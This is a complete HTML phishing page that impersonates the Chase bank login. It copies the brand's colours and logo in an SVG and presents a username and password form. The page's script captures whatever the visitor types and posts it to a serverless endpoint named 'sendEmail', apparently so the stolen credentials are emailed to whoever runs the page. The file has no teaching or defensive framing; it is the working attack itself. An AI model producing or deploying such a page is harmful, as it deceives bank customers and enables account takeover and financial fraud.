<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Chase Login</title>
<style>
body {
font-family: Arial, sans-serif;
background-color: #f0f4fa; /* light blue similar to Chase */
display: flex;
justify-content: center;
align-items: center;
height: 100vh;
margin: 0;
}

.container {
background: #fff;
padding: 50px 40px;
border-radius: 12px;
width: 400px;
box-shadow: 0 6px 20px rgba(0,0,0,0.2);
text-align: center;
}

.logo {
margin-bottom: 35px;
}

/* Input fields styling similar to Chase login */
input {
display: block;
width: 100%;
padding: 14px;
margin: 12px 0;
border-radius: 6px;
border: 1px solid #ccc;
font-size: 16px;
outline: none;
transition: border-color 0.2s;
}

input:focus {
border-color: #0072ce;
}

/* Sign in button styling */
button {
width: 100%;
padding: 14px;
background-color: #0072ce;
color: #fff;
border: none;
border-radius: 6px;
font-size: 16px;
font-weight: bold;
cursor: pointer;
transition: background-color 0.2s;
}

button:hover {
background-color: #005ea6;
}

#result {
margin-top: 18px;
font-weight: bold;
}
</style>
</head>
<body>

<div class="container">

<!-- Chase Logo: Accurate octagon + text -->
<div class="logo">
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 100" width="200" height="60">
<!-- Octagon -->
<polygon points="50,0 150,0 200,50 150,100 50,100 0,50" fill="#0072CE"/>
<!-- CHASE Text -->
<text x="220" y="72" font-family="Arial, Helvetica, sans-serif" font-size="60" font-weight="bold" fill="#0072CE">CHASE</text>
</svg>
</div>

<!-- Login Form -->
<form id="loginForm">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button>
</form>

<div id="result"></div>

</div>

<script>
const form = document.getElementById('loginForm');
const resultDiv = document.getElementById('result');

form.addEventListener('submit', async (e) => {
e.preventDefault();

const username = e.target.username.value;
const password = e.target.password.value;

try {
const res = await fetch('/.netlify/functions/sendEmail', {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({ username, password })
});

const data = await res.json();
resultDiv.innerText = data.message;
resultDiv.style.color = res.status === 200 ? 'green' : 'red';
} catch (err) {
resultDiv.innerText = 'Network error';
resultDiv.style.color = 'red';
}
});
</script>

</body>
</html>
